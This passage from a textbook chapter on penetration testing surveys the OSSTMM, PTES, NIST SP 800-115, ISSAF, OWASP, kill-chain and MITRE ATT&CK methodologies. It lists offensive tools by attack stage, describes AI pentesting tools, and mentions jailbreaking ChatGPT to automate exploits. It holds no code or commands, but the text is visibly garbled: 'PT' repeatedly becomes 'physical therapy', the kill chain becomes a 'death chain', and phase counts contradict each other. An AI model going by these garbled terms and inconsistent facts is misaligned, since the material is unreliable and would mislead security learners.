• Competitive intelligence: identify data breaches that may confer an edge to competitors

Phase IV: Interactive control test phase

• Quarantine assessment: evaluate the effects of quarantine protocols on the designated

recipient.

• Privilege audit: assess the effectiveness of permission and the potential ramifications of unauthorized privilege escalation.

• Survivability validation: assessing the resilience and recovery of the system.

• Examine alarms and logs: assess audit protocols to ensure precise event documentation.

OSSTMM encompasses all facets of a security assessment, including preparation, execution,

and data analysis. The chapter in OSSTMM addressing international standards, laws, rules,

and best practices is quite beneficial.

Advantages

• Comprehensive strategy to ensure thorough test coverage.

• Ability to adjust to intricate physical therapy settings.



• Comprehensive documentation to guarantee a thorough comprehension of the

procedure.

Limits

• It may be overly complicated for basic PT.

• Demands extensive skill for efficient utilization.

• Absence of established criteria for physical therapy.





14 Traditional vs Generative AI Pentesting

PTES methodology

The Penetration Testing Execution Standard (PTES) is a standardized PT technique includ-

ing five phases: pre-engagement, information collecting, discovery, operation, and reporting.

PTES is frequently employed in less intricate PT contexts (Dinis & Serrão, 2014). The PTES

(Penetration Testing Execution Standard) technique consists of seven main components. The

process encompasses the initial discussion regarding the necessity for a penetration test, followed by the stages of intelligence gathering and threat modeling, wherein testers acquire

background information about the target organization. This is succeeded by the scanning,

exploitation, and post-exploitation of vulnerabilities, where the testers’ technical security expertise and business insight converge. Finally, the reporting phase encapsulates the entire procedure in a manner comprehensible and advantageous to the client.

THE STAGES OF THE PTES METHODOLOGY

Pre-commitment interactions

Pre-engagement meetings with the client facilitate discussions on the extent of coverage for the forthcoming penetration test. All obligations established with the client are delineated at this phase.

Information gathering

The information-gathering step involves collecting all relevant data on the firm being evaluated. To accomplish this, the tester employs social networks, Google hacking (to obtain

sensitive data through specialized search queries), or footprinting (to gather publicly accessible information on target computer systems using techniques such as network enumeration,

operating system identification, and Whois queries, among others). Network enumeration,

operating system identification, Whois inquiries, SNMP requests, port scanning, etc. The

acquired information on the target offers significant insights into the security protocols.

Threat modeling

Threat modeling utilizes the information acquired during intelligence collection. The data are examined to identify the most efficient strategy for assaulting the target system. The primary objective is to ascertain the vulnerabilities of the target and formulate an assault strategy.

Vulnerability analysis

Upon identifying the most successful assault on the target, the subsequent stage is to ascertain the method of access. At this step, the information collected in prior rounds is analyzed to assess the feasibility of the selected assault. Specifically, data obtained from port scans, vulnerability assessments, or intelligence collection is taken into account.

Operation

The exploitation phase predominantly employs brute force methods. This step is initiated

only if a certain sort of exploit is guaranteed to accomplish the intended objective. It is possible that enhanced security measures might restrict access to the target system.





Foundations of pentesting 15

Post-op

The post-exploitation phase is an essential component of PT. The process begins upon the

breach of the targeted system and assesses which data within the system holds the most value.

The objective is to demonstrate the financial repercussions that a leak or loss of this information might impose on the firm.

Reports

The reporting step is unequivocally the most critical aspect of an intrusion test, since it must substantiate its need. The report delineates the outcomes of the penetration test and the methodology employed. Primarily, it should emphasize the vulnerabilities that require rectification and the methods to safeguard the target system from such assaults. Engaging a professional

services firm to conduct an information systems vulnerability audit is strongly advised in an increasingly complex IT landscape, which is therefore expanding its attack surface. Regularly scheduling penetration tests is recommended, as information systems develop concurrently

with infrastructure changes, leading to the emergence of vulnerabilities. Figure 1.3 illustrates

the several phases of the PTES technique.

Figure 1.3 The stages in the PTES methodology.





16 Traditional vs Generative AI Pentesting

Benefits

• Systematic methodology to ensure test repeatability.

• Appropriate for less intricate physical therapy settings.



• Comprehensive documentation to guarantee a thorough comprehension of the

procedure.

Limits

• May exhibit insufficient adaptability to intricate physical therapy situations.

• The testing steps may be restrictive and fail to encompass all facets of PT.

• Certain elements of PT are up to the examiner’s discretion.

NIST methodology SP 800-115

NIST SP 800-115 is a PT methodology developed by the US National Institute of Standards

and Technology (NIST) (Pascoe, 2023). The process consists of four phases: planning, information collecting, PT, and reporting. NIST SP 800-115 is frequently utilized in governmental and regulated settings.

The NIST SP 800-115 approach comprises six primary phases:

• The planning and preparation phase entails establishing the PT objectives, securing

requisite authorizations, and formulating a roadmap for subsequent operations.

• Information acquisition: this phase seeks to collect data about the PT target, including IP addresses, domain names, and contact details.

• Vulnerability detection: this phase entails scanning the target to ascertain known and

prospective vulnerabilities. Vulnerability scanning software can automate this process.

• Exploitation: In this phase, you will gain unauthorized access to the targeted systems by leveraging the identified vulnerabilities. There exist two categories of attacks: manual

and automated.

• Preserve access: should the attacker get illegal entry, this phase involves sustaining that access to further investigate and compromise the target systems.

• Results Analysis: This step involves examining the PT results and composing a compre-

hensive report on the found vulnerabilities, attack methodologies, and suggestions for

mitigating the vulnerabilities.

NIST SP 800-115 is regarded as a thorough and organized technique; yet, it faces criticism

for its inflexibility and emphasis on known vulnerabilities over new ones.

The ISSAF (Information Systems Security Assessment

Framework)

ISSAF (Information Systems Security Assessment Framework) is a well-recognized PT meth-

odology for evaluating the security of information systems, created by the SANS Institute in

collaboration with its IT security teaching and research professionals (Nabila et al., 2023).

ISSAF conducts a systematic and comprehensive security assessment encompassing the

information collecting on the target, the vulnerability finding phase, exploit testing, and the evaluation of results. The ISSAF outlines a seven-phase methodology for doing PT. The pre-paratory phase: this involves strategizing the PT by delineating objectives and expectations,





Foundations of pentesting 17

identifying stakeholders, establishing test parameters, defining rules of engagement, selecting tools, forming work teams, and outlining processes to be adhered to.

• The data collecting step includes understanding the target system and its environment.

At this juncture, reconnaissance methods may be utilized to ascertain hosts, open ports,

active services, operating systems, web applications, and analogous components.

• The threat modeling step involves risk assessments utilizing risk analysis methods to

identify essential assets and weaknesses that may be exploited by attackers. This phase

also formulates a framework for prospective assault scenarios and their corresponding

repercussions.

• The vulnerability finding process entails doing automated vulnerability assessments to

detect security flaws inside the system. This phase may also involve doing manual test-

ing to verify the discovered results.

• In the exploitation phase, vulnerabilities are utilized to obtain unauthorized access to the system or data. This phase may also involve the application of social engineering

strategies to mislead consumers into revealing confidential information.

• The post-exploitation phase must concentrate on maintaining illicit access to the sys-

tem or data. It may include creating additional accounts, modifying permissions, and

deleting files and/or activity records.

• The reporting step entails articulating the outcomes of the PT and communicating them

to the stakeholders. This must include repair of detected vulnerabilities and suggestions

to assess the overall security posture.

The benefits of ISSAF are numerous:

• Systematic approach: ISSAF employs a methodical and organized methodology that

ensures comprehensive coverage of all security facets of the target system.

• Flexibility: ISSAF is engineered to be adaptive to many circumstances and physical

training conditions, rendering it exceptionally versatile.

• ISSAF offers a comprehensive analysis of the target system’s security by finding vulner-

abilities and evaluating their possible consequences.

• ISSAF advocates for comprehensive recording of each phase in the PT process, hence

enhancing the analysis and presentation of outcomes.

• Nonetheless, ISSAF possesses several limitations:

• Complexity: owing to its systematic characteristics, ISSAF may be intricate, necessitat-

ing comprehensive training and experience for its utilization.

• Time and expense: ISSAF may be labor-intensive and expensive, necessitating meticu-

lous preparation and the participation of several specialists.

• Insufficient updates: while ISSAF is extensively utilized, its most recent version is from 2005, potentially overlooking contemporary technology and vulnerabilities.

• ISSAF is a comprehensive and adaptable technique that provides a profound insight

into the security of target systems. Nonetheless, its intricacy and possible expense may

not be appropriate for many physical therapy situations. Furthermore, its absence of

recent upgrades may restrict its applicability in some instances.

OWASP methodology

OWASP (Open online Application Security Project) is a non-profit organization dedicated

to enhancing online application security by providing information, tools, and standards.





18 Traditional vs Generative AI Pentesting

The OWASP PT methodology addresses web application vulnerabilities and is among the

most prevalent methods for web application security testing (Bach-Nutman, 2020). Therefore, let us examine the OWASP approach in greater detail: stages, advantages and disadvantages,

and so forth.

The OWASP phases

• Planning and reconnaissance: This step entails collecting information on the web appli-

cation to be evaluated, encompassing its objectives, users, foundational technologies,

and architecture. It also delineates the application’s access points and danger zones.

• Application mapping: This step entails delineating the architecture and content of the

web application, encompassing URLs, forms, cookies, parameters, and dynamic com-

ponents. It facilitates a deeper comprehension of the application and enhances the plan-

ning of following examinations.

• Vulnerability identification: This phase employs automated techniques to identify

known vulnerabilities in the online application, including SQL injections, cross-site

scripting (XSS), and authentication weaknesses, among others. It also recognizes appli-

cation-specific vulnerabilities that may alone be identified by manual testing.

• Manual assessment: This step involves manual testing to identify application-specific

vulnerabilities, including business logic flaws, session management issues, and data vali-

dation mistakes. It facilitates a deeper comprehension of the vulnerabilities identified

in the prior phase and allows for the identification of vulnerabilities that can alone be

uncovered through manual testing.

• Exploitation: This phase entails leveraging identified vulnerabilities to illustrate their possible effects on the application and data. It also validates the vulnerabilities identified in the earlier rounds.

• Documentation and reporting: This phase involves cataloging the identified vulnerabili-

ties, assessing their possible effect, detailing the reproduction steps, and providing sug-

gestions for remediation. It facilitates the clear and succinct presentation of test results.

Benefits of OWASP

• OWASP offers free, open-source PT tools and materials to enhance online application

security.

• The OWASP approach emphasizes online application vulnerabilities and offers precise

rules for their detection and remediation.

• OWASP advocates for a comprehensive strategy to web application security, incorpo-

rating security testing at every stage of the software development lifecycle.

• The OWASP methodology is continuously revised to address emerging threats and

technology.

Limits of OWASP

While the OWASP approach has several benefits, it also possesses specific limitations:

• Complexity: OWASP is an intricate approach necessitating a profound comprehension

of IT security and PT methodologies. Employing this approach for security testing may

be exceedingly time-intensive and frequently necessitates substantial technological and

human resources.





Foundations of pentesting 19

• Inconsistency: The intricate nature of the OWASP approach results in significant vari-

ability in testing outcomes across different testers. This complicates the comparison of

outcomes and the formulation of security judgments.

• Update: As information technology security advances swiftly, tools, methodologies, and

vulnerabilities are in a state of perpetual flux. The OWASP approach requires continu-

ous updates to maintain its efficacy. Maintaining an intricate process current might

prove to be difficult.

• Technical orientation: OWASP is a framework centered on the technical dimensions of

information technology security. It neglects the organizational, human, and procedural

dimensions of security, which are equally vital in security management.

• Tool dependency: While the OWASP methodology does not mandate certain PT tools,

it does depend on several tools to enhance security testing. This may render the process

reliant on specific tools, perhaps leading to complications if these tools become out-

dated or unsupported.

Cyber kill chain methodology

The cyber kill chain methodology is a component of intelligence-driven protection aimed at

identifying and thwarting malicious infiltration efforts. Security professionals may employ

this strategy to understand how assailants achieve their objectives (Yadav & Rao, 2015).

Cyber death chains extend the concept of military kill chains, offering a framework for

safeguarding cyberspace. This method aims to improve the capacity for the proactive detec-

tion and response to intrusions. The Cyber Elimination Chain comprises a seven-step security protocol designed to mitigate the effects of cyber threats.

Lockheed Martin asserts that cyberattacks can progress through seven separate phases,

commencing with identification and concluding with the effective execution of the operation.

Familiarity with the cyberattack kill chain enables security professionals to more effectively implement security measures at different stages of the attack lifecycle to prevent assaults. It also aids in comprehending the phases of an assault, which is advantageous for predicting

the strategies employed by an adversary. Figure 1.4 shows the several steps that make up the

Cyber Kill Chain methodology.

• Reconnaissance: Acquiring information about the target to identify vulnerabilities.

• Weaponization: Develop a deployable hostile payload utilizing an exploit and a

backdoor.

Figure 1.4 Cyber kill chain methodology.





20 Traditional vs Generative AI Pentesting

• Delivery: Transmit the armed package to the recipient by e-mail, USB, etc.

• Utilization Exploiting a vulnerability through the execution of code on the victim’s

machine.

• Installation: Execute malware on a designated system

• Command & Control: Establish a command and control channel for bidirectional

communication and data transmission.

• Actions on objectives: Executing steps to attain objectives/goals

Figure 1.5 shows an example of each Cyber Kill Chain Methodology step.

MITRE ATT&CK

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a frame-

work and knowledge repository that delineates an adversary’s actions during the execution

of cyberattacks (Pennington et al., 2019). It came from the MITRE Corporation, a non-profit entity that oversees federally financed research and development institutions. It provides a comprehensive database of methods and strategies utilized by adversaries during assaults,

including initial access, execution, persistence, and exfiltration. It outlines supplementary techniques and methodologies, including reconnaissance, credential acquisition, lateral movement, and data exfiltration. ATT&CK is widely used by cybersecurity experts, threat intelligence analysts, and researchers to understand certain cyber risks and formulate effective protection tactics against attacks by threat actors (Chamkar et al., 2024; Hubbard, 2020).

MITRE ATT&CK provides a standardized lexicon and architecture for defining and catego-

rizing adversary actions to improve cybersecurity across various enterprises. The framework is regularly updated to incorporate new knowledge on strategies, approaches, and processes

based on actual cases (Chamkar et al., 2022). Thus, it is relevant, valid, and advantageous in aiding firms in their struggle against escalating cyber dangers.

Reconnaissance

Collect e-mail addresses and

conference information.

Combine the exploit with the

Weaponization

backdoor and insert it into the

payload.

Distribute files containing weapons

Delivery

to victims' systems via e-mail, the

Internet or USB.

Exploitation

The vulnerability is exploited to

execute code on the victim's system.

Installation

Install the malware on the target

asset.

Command & Control

Open a channel for remote control of

the victim and tracks.

If access such as keyboard

Actions on Objectives

manipulation is made possible, the

attacker has achieved his goal.

Figure 1.5 Cyber kill chain methodology.

Foundations of pentesting 21

The fundamental principle of MITRE ATT&CK is straightforward: although attackers

may vary, their modus operandi, specifically Tactics, Techniques, and Procedures (TTPs),

remains consistent. MITRE ATT&CK, or Adversarial Tactics, Techniques, and Common

Knowledge, is a prominent framework within the MITRE FMX project, functioning as a

knowledge repository that systematically catalogs the common TTPs employed by Advanced

Persistent Threats (APTs). This framework serves as a fundamental reference for security

professionals to begin understanding, analyzing, and safeguarding against advanced cyber

threats. The framework’s additional objective is to unify risk identification and mitigation strategies across diverse environments by modeling adversaries’ behavior instead of their

identity.

The MITRE ATT&CK framework is based on a matrix that describes the typical stages

of a computer attack, from preparation to post-exploitation. Here are the steps of MITRE

ATT&CK:

1. Reconnaissance: In this initial phase, attackers gather information about their targets

to identify potential vulnerabilities and weaknesses in their defenses. This can include

activities such as social engineering, OSINT (Open Source Intelligence) collection, and

port analysis.

2. Initial access: Once attackers have identified potential weaknesses, they use a variety of methods to gain initial access to their target environment. This can include exploiting

vulnerabilities, phishing, or using stolen credentials.

3. Execution: Once attackers gain initial access, they typically execute code or tools to

achieve their goals. This can include running malware, performing command and con-

trol (C2) communications, or exploiting vulnerabilities to elevate privileges.

4. Persistence: To maintain access to the target environment, attackers often use a variety of persistence techniques to ensure that their tools and malware remain active even

after the initial attack vector has been removed.

5. Elevation of privilege: To gain deeper access to the target environment, attackers often seek to elevate their privileges, allowing them to perform actions that are typically

reserved for administrators or other high-level users.

6. Defense evasion: To avoid detection, attackers use various techniques to evade detec-

tion and remain undetected for as long as possible. This can include activities such as

evasing antivirus, obfuscation, and using encryption.

7. Credential access: Once in the target environment, attackers often seek to obtain legitimate user credentials, which can provide them with additional access and privileges.

8. Discovery: At this point, attackers perform reconnaissance on the target environment to gather information about the network topology, user accounts, and installed software.

9. Lateral movement: Once attackers have gained credentials or other access, they often

move laterally into the target environment to gain access to additional systems or data.

10. Collection: Once attackers gain access to target systems, they typically begin collecting information or stealing data from those systems.

11. Exfiltration: Attackers will often seek to exfiltrate data or other assets they have collected from the target environment, using a variety of techniques to avoid detection.

12. Command and Control (C2): refers to an attack technique used by attackers to estab-

lish communication with a compromised system and give instructions remotely from a

command and control (C&C) server. Attackers use this technique to gain access to con-

fidential information, to download or execute malicious files on the compromised sys-

tem, to exfiltrate sensitive data, or to extend their grip on the organization’s network.





22 Traditional vs Generative AI Pentesting

These steps are not necessarily linear or sequential, and different attackers may use different combinations of tactics and techniques depending on their goals and the target environment.

The fundamental principle of MITRE ATT&CK is straightforward: although attackers

may vary, their modus operandi, specifically Tactics, Techniques, and Procedures (TTPs),

remains consistent (Al-Sada et al., 2024; Copeland & Copeland, 2021). MITRE ATT&CK, or Adversarial Tactics, Techniques, and Common Knowledge, is a prominent framework

within the MITRE FMX project, functioning as a knowledge repository that systematically

catalogs the common TTPs employed by Advanced Persistent Threats (APTs) (Kinnunen,

2022). This framework serves as a fundamental reference for security professionals to begin understanding, analyzing, and safeguarding against advanced cyber threats. The framework’s

additional objective is to unify risk identification and mitigation strategies across diverse environments by modeling adversaries’ behavior instead of their identity.

Adversary profile

Creating an opponent profile is an efficient approach to build a strategy plan for the red

team’s performance in evaluations. It may be as simple as the table shown in Figure 1.6. The aim is to produce a succinct statement detailing the acts the red team will emulate. The profile is based on the extraction of TTPs from a threat intelligence report on APT19. Alternatively, one may discover APT19 on the MITRE ATT&CK website to obtain a similar description

and associated procedures, as seen in Table 1.1.

Contribution of MITRE

The MITRE ATT&CK architecture constitutes a universally accessible repository of adver-

sary strategies and methods derived from empirical observations. It serves as a basis for formulating certain threat models and approaches within the business sector, government, and

cybersecurity community. MITRE ATT&CK offers a detailed matrix of tactics and strategies employed by threat actors, facilitating the comprehension of attack behaviors and improving the detection, protection, and analysis of cybersecurity threats. Its contribution enhances security posture by fostering educated decision-making, establishing a shared lexicon for

cybersecurity risks, and strategically orchestrating defenses against advanced cyber threats.

The ATT&CK architecture, bolstered by ongoing updates and contributions from global

cybersecurity experts, is an essential tool for effectively countering and mitigating cyberattacks. Figure 1.7 shows the contribution of MITRE ATT&CK.

Tools for pentesting according to MITRE ATT&CK

For each stage of the MITRE ATT&CK framework, there are a variety of tools and tech-

niques that attackers can use to carry out their attack. Here is a non-exhaustive list of tools commonly used for each step:

1. Reconnaissance:

• Amass: A tool for gathering information about targets, using various techniques

such as crawling, scraping, and bruteforce DNS.

• Sn1per: An automated vulnerability scanning and network reconnaissance tool,

which performs port, service, and vulnerability scans.

• theHarvester: A tool for gathering information about targets, by retrieving email

addresses, domain names, and subdomains.

• Recon-ng: An automated web reconnaissance tool, which collects information

about targets from public and private sources.

• Maltego: A tool for information gathering and network mapping, which uses graphs

to visualize the relationships between the different elements of a target.



Foundations of pentesting

Figure 1.6 MITRE ATT&CK matrix.

23

24 Traditional vs Generative AI Pentesting

Table 1.1 TTPs of APT19

Category

Description

Description

APT19 is a China-based threat group that has targeted various industries, including

defense, finance, energy, pharmaceuticals, telecommunications, high-tech, education,

manufacturing, and legal services.

But et intention

Exist in the network to enumerate systems and information to maintain command

and control to support future attacks.

Initial Access

Phishing emails with malicious RTF and XLSM attachments to deliver the initial

exploits.

Execution/Evasion

PowerShell; Regsvr32; Rundll32; Scripting

C2 Overview

HTTP via common port—TCP port 80 for C2

Persistence

Modify existing service—Port 22 malware is registered as a service.

Analyze

Compare

Allows you

and monitor

the ms of

to prioritize

Adversary

TTP

different

detection

Emulation

Share

Capitalize

revolution

attackers

and

analysis

Figure 1.7 MITRE ATT&CK contribution.

2. Initial Access:

• Aircrack-ng: A WiFi password cracking tool, used to recover WiFi encryption keys.

• Gophish: An automated phishing tool, which allows you to create and launch

phishing campaigns targeting an organization’s employees.

• Bash Bunny: A hardware hacking tool, which can be inserted into a computer to

execute malicious commands or steal data.

3. Execution:

• macro_pack: A tool for creating malicious Office macros, which can be used to

execute code remotely.

• Donut: A stealth tool to run malicious PE files without being detected by antivirus

software.

4. Persistence:

• Empire: A post-exploitation tool, which allows attackers to maintain access to a

target over the long term.

• Impacket: A Python script library for communication with network protocols,

which can be used to gain persistent access to a target system.

• pwncat: A post-exploitation tool that allows communication with a compromised

system via a network connection.

Foundations of pentesting 25

5. Privilege Escalation:

• Rubeus: A Windows privilege escalation tool, which allows attackers to retrieve

Kerberos tickets to gain access to protected systems.

• UACMe: A Windows privilege escalation tool, which exploits User Account Control

(UAC) vulnerabilities.

• SharpUp: A Windows privilege escalation tool, which uses Windows service abuse

techniques to gain privileged access.

6. Defense Evasion:

• Meterpreter: A remote access tool for Windows systems that allows attackers to

take control of an infected machine.

• ProxyChains: A tool for routing connections through proxy servers, making it more

difficult to trace them.

• Invoke-Obfuscation: A tool for obfuscating PowerShell code and evading security

software detection mechanisms.

• Veil: A shellcode generator for creating custom payloads for social engineering

attacks and PT.

7. Credentials Access:

• Mimikatz: A password recovery tool for Windows systems that can extract pass-

words stored in memory.

• Hashcat: A password crack tool used to recover passwords from hashes.

• Responder: A tool that can be used to capture credentials in response to network

service requests.

• Cain and Abel: A password recovery tool for Windows systems that can recover

passwords stored locally or on the network.

• John the Ripper: An open-source password crack tool that supports many hashing

algorithms.

• THC Hydra: A command-line password crack tool that supports many protocols.

• LaZagne: An open-source password recovery tool that can recover passwords

stored on the system.

8. Discovery:

• BloodHound: An Active Directory topology visualization tool for mapping poten-

tial attacks.

• Seatbelt: A tool for collecting system information about Windows machines.

• Kismet: A tool for detecting and analyzing wireless networks.

• ADRecon: A tool for collecting Active Directory information.

9. Lateral movement:

• Mimikatz: A password recovery tool for Windows systems that can be used to com-

promise user accounts and move laterally across the network.

• PsExec: A tool for executing commands remotely on Windows machines.

• WMIOps: A tool for running WMI commands remotely on Windows machines.

• CrackMapExec: A tool that can be used to run remote commands on Windows and

Linux machines.

• Infection Monkey: A tool to test the security of a network by simulating real

attacks.

10. Collection:

• PowerSploit: A suite of PowerShell tools for vulnerability scanning and data extrac-

tion on Windows systems.

• PowerUpSQL: A tool for detecting and exploiting security vulnerabilities in SQL

Server database servers.





26 Traditional vs Generative AI Pentesting

11. Exfiltration:

• DnsCat2: It is a data tunneling tool that allows data to be sent through the DNS

protocol. It is often used to exfiltrate data by bypassing firewalls or intrusion detec-

tion systems.

• CloakifyFactory: It is a tool that allows you to clothe data by transforming it into

harmless formats, such as images or audio files, in order to exfiltrate it without

being detected.

• Powershell-RAT: It is a remote control tool that allows attackers to access a com-

promised system and take control remotely. It uses Powershell to execute com-

mands and retrieve data remotely, and can be used to exfiltrate sensitive data.

12. Command and Control:

• Metasploit: this is a project related to the security of computer systems. Its purpose

is to provide information on vulnerabilities in computer systems, to assist in pen-

etration and the development of signatures for intrusion detection systems.

• Covenant: Covenant is a .NET command and control framework that aims to high-

light the .NET attack surface, facilitate the use of .NET offensive crafting, and serve

as a collaborative command and control platform for red teams.

• Empire: This is a post-exploitation and adversary emulation framework that is used

to help red teams and penetration testers. The Empire server is written in Python 3

and is modular to allow for operator flexibility. Empire comes with a built-in client

that can be used remotely to access the server. There is also a graphical interface

available to remotely access the Empire server, Starkiller.

Challenges in penetration testing

Penetration testing is essential for assessing the security of systems and networks by mimicking

actual attacks to identify vulnerabilities (Dalalana Bertoglio & Zorzo, 2017). Nevertheless, as technology advances swiftly, PT encounters numerous substantial hurdles, rendering it

a vital domain for continuous research. This literature analysis examines the primary chal-

lenges in PT and identifies deficiencies in current approaches.

A principal problem is the rapid advancement of foundational technologies, such as Wi-Fi,

5G, and IoT, which generate progressively intricate testing settings (Dalalana Bertoglio &

Zorzo, 2017). Although research has thoroughly examined PT in multi-layered networks, a deficiency persists in evaluating security within highly protected systems where a singular important hardware component is linked via Ethernet, especially in white-box testing contexts (insider threats). Moreover, current PT frameworks frequently prioritize automated

testing, which, although efficient, may generate false positives and overlook subtle attack routes (Hilario et al., 2024). Moreover, most frameworks adopt a black-box methodology, presuming the attacker had no prior knowledge of the system, hence diminishing their efficacy in situations where an insider has access to system specifications. The extensive nature of these frameworks may result in inefficiencies by assessing unnecessary vulnerabilities,

hence depleting critical time and resources.

Automation poses an additional challenge in PT. Although automated technologies aid

in detecting vulnerabilities, they cannot fully replace manual testing. Automated scans frequently fail to identify complex vulnerabilities and may produce false positives and false

negatives, resulting in inaccurate security evaluations (Gupta et al., 2023). Furthermore, in settings characterized by intricate configurations or outdated systems, automation may be

unfeasible or inefficient.





Foundations of pentesting 27

The deficiency of proficient penetration testers exacerbates the process. Successful PT

necessitates a comprehensive comprehension of system architectures, network security,

and adversarial techniques. Many businesses, especially those with constrained resources,

encounter challenges in finding and developing competent security experts. Accessibility is a challenge, as PT necessitates authorized access to systems, networks, and applications. This can be especially challenging in large organizations with rigorous access constraints.

A significant problem is the potential for false positives produced by PT technologies.

These technologies may identify fictitious or non-exploitable vulnerabilities, causing security teams to waste time and resources on issues that present no genuine threat. Moreover, PT

may interfere with business operations, requiring meticulous preparation to reduce down-

time and operational disturbances. Legal and ethical considerations must be addressed, as

PT entails simulating attacks on organizational systems. Adhering to legislation and securing clear authorization from stakeholders are crucial for conducting testing responsibly (Fatima

et al., 2023).

In summary, PT encounters various problems, such as the swift advancement of technol-

ogy, the inadequacies of existing testing procedures, the restrictions of automation, and the necessity for proficient individuals. These problems underscore the necessity for additional study to improve PT methodologies. To effectively address these difficulties, companies must set clear testing objectives, utilize suitable tools and processes, perform comprehensive risk assessments, and engage key stakeholders throughout the testing process. Engaging with seasoned penetration testers is essential for mitigating security threats and maintaining adherence to legal and ethical norms.

AI-driven penetration testing

Generative AI (GenAI) and Large Language Models (LLMs), including OpenAI’s ChatGPT,

are transforming the penetration testing (pentesting) sector by automating tasks, enhanc-

ing creativity, and enabling real-time adaptability. The integration of AI-driven tools in PT

enhances efficiency, accuracy, and proactive threat management. Generative AI (GenAI) has

advanced penetration testing (pentesting) by offering innovative insights to improve cyber-

security evaluations. Organizations can utilize advanced AI model capabilities to simulate

real-world attacks for automated reconnaissance and to defend against complex cyber threats.

GenAI facilitates automated data collection from public sources, customization of phishing

emails, and the development of persuasive social engineering scenarios, encompassing deep

fakes and personalized impersonations. These tools enable ethical hackers to replicate attack techniques with compelling realism, focusing on credential harvesting, phishing campaigns,

and malware deployment targeting specific vulnerabilities and behavioral patterns. GenAI

facilitates the creation of comprehensive pentesting reports, examines attack patterns, and suggests security strategies relevant to proactive defense. Although scalable, efficient, and adaptable, GenAI presents new challenges, including ethical dilemmas, data privacy issues, instances of false positives, and the potential for undue reliance on systems. The conduct of an unethical individual with access to GenAI technology underscores the necessity of ethical guidelines, prior consent-based testing, and robust data protection strategies. The risks associated with GenAI are mitigated by its ability to simulate and capture evolving threat tactics in response to contemporary cybersecurity challenges. In the future, GenAI may facilitate advancements in proactive threat hunting, IoT and cloud security testing, and real-time defense. Organizations integrating GenAI into their penetration testing workflows will establish security infrastructures that are resilient to contemporary cyber threats, while adhering to ethical AI practices.





28 Traditional vs Generative AI Pentesting

Key features of AI-driven penetration testing

1. Automation of Repetitive Tasks: AI tools can automate mundane but critical tasks such as scanning for vulnerabilities, generating reports, and monitoring network traffic. This

allows penetration testers to focus on more complex, high-level analysis.

2. Advanced Threat Detection: AI-driven systems excel at detecting sophisticated and zero-day vulnerabilities that may go unnoticed using traditional methods. Machine

learning models are trained to identify patterns and anomalies indicative of potential

breaches.

3. Predictive Analytics: Leveraging past attack data, AI tools predict potential vulnerabilities and attack vectors. This enables penetration testers to anticipate and mitigate risks

before they are exploited.

4. Real-Time Analysis: AI enhances the speed of PT by providing real-time analysis of systems, applications, and networks. This significantly reduces the time required to

uncover critical vulnerabilities.

5. Enhanced Reporting and Insights: AI tools can generate comprehensive and detailed reports on identified vulnerabilities and their potential impact. This helps organizations

prioritize and address issues more effectively.

Benefits of AI-driven penetration testing

• Efficiency: AI processes large datasets and performs reconnaissance tasks rapidly, saving significant time.

• Scalability: AI-driven solutions can handle testing across extensive and complex systems, making them ideal for enterprise-level environments.

• Accuracy: Machine learning algorithms reduce human error, ensuring precise identification of vulnerabilities.

• Cost-Effectiveness: By automating processes, AI reduces the need for extensive human resources, cutting operational costs.

• Continuous Testing: AI tools enable ongoing assessments, providing organizations with real-time insights into their security posture.

Tools for AI-driven penetration testing

AI-powered PT tools have become indispensable for ethical hackers and security profession-

als. Below is a curated list of tools along with their features and sources:

1. HackerGPT

A versatile tool designed to assist in identifying vulnerabilities and automating tasks.

Source: HackerGPT

2. BurpGPT

Integrates with Burp Suite to enhance vulnerability scanning using AI-powered insights.

Source: BurpGPT

3. PentestGPT

Automates reconnaissance, scanning, and reporting to support penetration testers.

Source: PentestGPT

4. BugBountyGPT

Tailored for bug bounty professionals to identify and report vulnerabilities.

Source: BugBountyGPT





Foundations of pentesting 29

5. CybGPT

A comprehensive tool offering AI-powered security assessments and threat intelligence

integration.

Source: CybGPT

6. h4ckGPT

Real-time assistance and insights for vulnerability identification.

Source: h4ckGPT

7. Hacking APIs GPT

Automates API vulnerability scanning and reporting.

Source: Hacking APIs GPT

8. BugHunterGPT

Designed to detect and report security vulnerabilities efficiently.

Source: BugHunterGPT

9. Ethical Hacker GPT

Provides AI-driven vulnerability assessments and real-time hacking insights.

Source: Ethical Hacker GPT

10. GPT White Hack

Real-time recommendations for mitigating identified vulnerabilities during PT.

Source: GPT White Hack

11. DeepExploit

An AI-powered PT tool designed to automate and optimize the process of identifying

and exploiting vulnerabilities in target systems.

Source: DeepExploit

Applications of AI in Pentesting include the following:

1. Reconnaissance: AI tools automate information gathering, providing comprehensive

target profiles quickly. This phase includes identifying subdomains, analyzing exposed

credentials, and mapping network topologies.

2. Vulnerability Scanning: AI enhances vulnerability scanners by identifying misconfigurations, outdated software, and potential entry points more accurately.

3. Phishing Simulations: AI-driven tools can craft realistic phishing emails to test organizational security awareness and employee susceptibility to social engineering.

4. Web Application Testing: AI tools focus on application-specific vulnerabilities, such as SQL injections, cross-site scripting (XSS), and broken authentication.

5. Network Security Analysis: AI monitors traffic patterns to detect unusual behavior that may signify breaches or attack attempts.

6. Continuous Monitoring: AI-driven systems offer real-time insights into security vulnerabilities, enabling immediate mitigation.

CHALLENGES AND ETHICAL CONSIDERATIONS

Overreliance on AI

Although Generative AI (GenAI) offers substantial benefits, excessive dependence on its

outputs may result in critical oversights. AI models such as ChatGPT frequently generate

responses based on environmental patterns and lack the contextual understanding of a

human expert. A false positive, which refers to the erroneous identification of a non-existent vulnerability, or a false negative, which involves the failure to detect existing vulnerabilities,





30 Traditional vs Generative AI Pentesting

can lead to penetration tests, data exfiltration, or even remote-access cyberattacks. The outputs of AI may lack accuracy; it can hallucinate or misinterpret a query, potentially causing confusion among testers. Human intervention is essential to validate AI insights and guarantee an equitable and impartial evaluation of security vulnerabilities.

Ethical and legal concerns

The function of artificial intelligence in PT raises significant ethical dilemmas. There exists a risk that, if exploited due to imprudent maximization, ChatGPT may become vulnerable to

jailbreaking or manipulation, thereby providing tangible opportunities for malicious entities to automate the development of exploits, phishing schemes, or malware. Additional ethical

considerations may arise when AI begins to simulate attacks that could potentially expose

sensitive information. Moreover, there exists a potential violation of human privacy when

sensitive information is unintentionally extracted for training AI models utilizing publicly accessible data. The misapplication by unauthorized individuals poses a risk, thereby exposing AI providers for PT organizations to potential legal complications.

Inherent bias in AI models

